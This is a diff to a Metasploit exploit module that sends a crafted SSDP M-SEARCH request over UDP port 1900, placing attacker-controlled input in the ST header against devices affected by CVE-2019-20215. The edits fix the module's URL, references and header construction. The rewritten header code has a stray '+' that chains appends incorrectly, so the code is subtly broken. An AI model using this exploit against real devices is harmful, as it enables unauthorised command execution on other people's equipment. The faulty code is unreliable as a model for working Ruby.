@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class Metasploit3 < Msf::Exploit::Remote
   Rank = ExcellentRanking
@@ -26,7 +24,7 @@ class Metasploit3 < Msf::Exploit::Remote
       'License'     => MSF_LICENSE,
       'References'  =>
         [
-          # ['CVE', 'nada'],
+          ['CVE', '2019-20215'],
           ['URL', 'https://medium.com/@s1kr10s/']
         ],
       'DisclosureDate' => 'Dec 24 2019',
@@ -68,7 +66,7 @@ class Metasploit3 < Msf::Exploit::Remote
     [
       Opt::RHOST(),
       Opt::RPORT(1900)
-    ], self.class)
+    ])
   end
 
   def exploit
@@ -85,12 +83,11 @@ class Metasploit3 < Msf::Exploit::Remote
     end
 
     connect_udp
-    header =
-      "M-SEARCH * HTTP/1.1\r\n" +
-      "Host:239.255.255.250:1900\r\n" +
-      "ST:#{val}\r\n" +
-      "Man:\"ssdp:discover\"\r\n" +
-      "MX:2\r\n\r\n"
+    header = "M-SEARCH * HTTP/1.1\r\n"
+    header << "Host:239.255.255.250:1900\r\n"
+    header << "ST:#{val}\r\n" +
+    header << "Man:\"ssdp:discover\"\r\n"
+    header << "MX:2\r\n\r\n"
     udp_sock.put(header)
     disconnect_udp
   end
